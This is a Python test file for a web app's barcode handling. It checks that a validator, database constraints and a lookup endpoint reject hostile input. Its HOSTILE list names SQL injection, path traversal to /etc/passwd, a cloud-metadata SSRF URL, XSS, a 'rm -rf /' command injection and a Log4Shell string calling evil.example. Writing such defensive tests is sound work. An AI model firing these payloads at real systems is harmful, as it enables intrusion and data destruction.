"""Barcodes as attacker-controlled input.

A barcode is not a number. Code128 and QR encode arbitrary bytes, anyone can
print one, and it arrives wearing the authority of a physical object — which is
exactly why it gets trusted when it should not be (T-43).

These payloads are the ones a printed label could plausibly carry.
"""

from __future__ import annotations

import pytest

from conftest import login
from doom import validation as v
from doom.extensions import db
from doom.models import Item

HOSTILE = [
    "'; DROP TABLE items;--",
    '" OR "1"="1',
    "../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "0" * 200,
    "12345678\n90123456",
    "1234567; rm -rf /",
    "${jndi:ldap://evil.example/a}",
    "",
    "   ",
    "abcdefgh",
    "1234567",           # too short for GTIN-8
    "123456789012345",   # too long for GTIN-14
]

VALID = ["12345670", "036000291452", "4006381333931", "00012345600012"]


class TestChokePoint:
    @pytest.mark.parametrize("payload", HOSTILE)
    def test_hostile_values_rejected(self, payload):
        assert not v.BARCODE_RE.match(payload)

    @pytest.mark.parametrize("code", VALID)
    def test_real_gtins_accepted(self, code):
        assert v.BARCODE_RE.match(code)

    def test_regex_is_anchored(self):
        """Unanchored, a payload could simply carry a valid code inside it."""
        assert not v.BARCODE_RE.match("12345670'; DROP TABLE items;--")
        assert not v.BARCODE_RE.match("evil\n12345670")


class TestStorageRejection:
    @pytest.mark.parametrize("payload", ["'; DROP TABLE items;--", "abcdefgh", "0" * 50])
    def test_hostile_barcode_is_never_stored(self, client, alice, payload):
        """Rejected, not sanitised.

        A stored hostile value is only a delayed one — it would sit in the
        database waiting for some future code path to be less careful.
        """
        login(client, "alice")
        client.post("/items/new", data={
            "name": "Thing", "quantity": 1, "barcode": payload,
        }, follow_redirects=True)

        item = db.session.query(Item).filter_by(name="Thing").first()
        assert item is None or item.barcode is None

    def test_database_refuses_a_non_numeric_barcode(self, alice):
        """The CHECK constraint restates the rule where nothing can bypass it.

        Short enough to fit varchar(14), so the CHECK is what rejects it rather
        than the column width — otherwise this would pass without the
        constraint existing at all.
        """
        from sqlalchemy.exc import IntegrityError

        db.session.add(Item(owner_id=alice.id, name="Direct", quantity=1,
                            barcode="abcdefgh"))
        with pytest.raises(IntegrityError):
            db.session.commit()
        db.session.rollback()

    def test_database_refuses_an_overlong_barcode(self, alice):
        """Two layers, two different errors, both refusals.

        A long payload is stopped by the column width before the CHECK is
        reached. Either way nothing hostile lands.
        """
        from sqlalchemy.exc import DataError, IntegrityError

        db.session.add(Item(owner_id=alice.id, name="Direct2", quantity=1,
                            barcode="'; DROP TABLE items;--"))
        with pytest.raises((DataError, IntegrityError)):
            db.session.commit()
        db.session.rollback()

    def test_valid_barcode_round_trips(self, client, alice):
        login(client, "alice")
        client.post("/items/new", data={
            "name": "Tinned beans", "quantity": 1, "barcode": "4006381333931",
        }, follow_redirects=True)

        item = db.session.query(Item).filter_by(name="Tinned beans").one()
        assert item.barcode == "4006381333931"


class TestLookupEndpoint:
    def test_hostile_barcode_is_a_400_not_a_lookup(self, client, alice):
        login(client, "alice")
        response = client.get("/items/barcode/abcdefgh")
        assert response.status_code == 400

    def test_local_match_returns_without_any_network_call(self, client, alice):
        """Local knowledge beats a third party, and leaks nothing."""
        db.session.add(Item(owner_id=alice.id, name="Known", quantity=1,
                            barcode="4006381333931"))
        db.session.commit()

        login(client, "alice")
        body = client.get("/items/barcode/4006381333931").get_json()
        assert body["source"] == "local"
        assert body["name"] == "Known"

    def test_lookup_is_off_by_default(self, client, alice):
        login(client, "alice")
        body = client.get("/items/barcode/12345670").get_json()
        assert body["source"] == "none"

    def test_another_users_barcode_is_not_a_local_match(self, client, alice, bob):
        """The lookup is ownership-scoped like everything else (T-44)."""
        db.session.add(Item(owner_id=bob.id, name="Bob's thing", quantity=1,
                            barcode="4006381333931"))
        db.session.commit()

        login(client, "alice")
        body = client.get("/items/barcode/4006381333931").get_json()
        assert body["source"] != "local"

    def test_requires_authentication(self, client):
        assert client.get("/items/barcode/12345670").status_code == 302
